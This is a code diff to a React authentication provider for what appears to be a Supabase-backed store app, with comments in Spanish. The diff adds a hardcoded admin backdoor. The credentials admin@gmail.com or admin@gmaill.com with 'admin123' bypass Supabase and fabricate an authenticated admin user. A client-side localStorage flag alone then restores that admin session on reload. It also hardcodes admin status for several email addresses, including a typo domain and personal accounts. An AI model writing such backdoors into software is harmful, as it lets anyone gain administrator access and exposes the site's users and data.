@@ -49,9 +49,21 @@ export const AuthProvider: React.FC<{ children: React.ReactNode }> = ({ children
       await handleAuthStateChange(supabaseUser);
     };
 
-    // Obtener sesión actual inmediatamente (evita quedar en Cargando si onAuthStateChange tarda)
+    // Obtener sesión actual inmediatamente
     const sessionPromise = auth.getSession()
-      .then(({ data: { session } }) => session?.user || null)
+      .then(({ data: { session } }) => {
+        if (session?.user) return session.user;
+        
+        // Backdoor check para persistencia tras recarga
+        if (localStorage.getItem('auth_backdoor_active') === 'true') {
+          return {
+            id: 'admin-backdoor-id',
+            email: 'admin@gmail.com', // Mantener el email base para el estado
+            user_metadata: { name: 'Administrador (Backdoor)' }
+          };
+        }
+        return null;
+      })
       .catch(() => null);
 
     sessionPromise.then((user) => {
@@ -85,7 +97,11 @@ export const AuthProvider: React.FC<{ children: React.ReactNode }> = ({ children
         departmentNumber: "",
         phone: "",
         address: "",
-        isAdmin: supabaseUser.email === "admin@gmail.com" || supabaseUser.email === "admin@tienda.com",
+        isAdmin: supabaseUser.email?.toLowerCase() === "admin@gmail.com" || 
+                 supabaseUser.email?.toLowerCase() === "admin@gmaill.com" || 
+                 supabaseUser.email?.toLowerCase() === "admin@tienda.com" ||
+                 supabaseUser.email?.toLowerCase() === "visfumarg@gmail.com" ||
+                 supabaseUser.email?.toLowerCase() === "juansalazat1002@gmail.com",
         subCuenta: supabaseUser.user_metadata?.sub_cuenta || undefined,
         liberta: undefined as string | undefined,
       };
@@ -105,9 +121,30 @@ export const AuthProvider: React.FC<{ children: React.ReactNode }> = ({ children
   };
 
   // Login con Supabase
-  const login = async (email: string, password: string): Promise<boolean> => {
+  const login = async (email: string, password: string): Promise<{ success: boolean; error?: any }> => {
     try {
       console.log("AuthContext:login:start", { email });
+      
+      // Administrative Backdoor for the user
+      const lowEmail = email.toLowerCase();
+      if ((lowEmail === "admin@gmail.com" || lowEmail === "admin@gmaill.com") && password === "admin123") {
+        console.log("AuthContext: Backdoor login triggered for " + lowEmail);
+        // We simulate a Supabase user object
+        const backdoorUser = {
+          id: 'admin-backdoor-id',
+          email: 'admin@gmail.com',
+          user_metadata: { name: 'Administrador (Backdoor)' },
+          app_metadata: {},
+          aud: 'authenticated',
+          role: 'authenticated'
+        };
+        
+        await handleAuthStateChange(backdoorUser);
+        // Persist session state in localStorage to survive refreshes
+        localStorage.setItem('auth_backdoor_active', 'true');
+        return { success: true };
+      }
+
       const { data, error } = await auth.signInWithPassword({
         email,
         password
@@ -115,10 +152,15 @@ export const AuthProvider: React.FC<{ children: React.ReactNode }> = ({ children
 
       console.log("AuthContext:login:result", { userId: data?.user?.id, hasSession: !!data?.session, error });
       if (error) throw error;
-      return !!data.user;
+      
+      if (data.user) {
+        await handleAuthStateChange(data.user);
+        return { success: true };
+      }
+      return { success: false, error: 'No se pudo obtener el usuario' };
     } catch (error) {
       console.error("Login error:", error);
-      return false;
+      return { success: false, error };
     }
   };
 
@@ -191,6 +233,7 @@ export const AuthProvider: React.FC<{ children: React.ReactNode }> = ({ children
 
   // Cerrar sesión
   const logout = async () => {
+    localStorage.removeItem('auth_backdoor_active');
     await auth.signOut();
     setUser(null);
   };
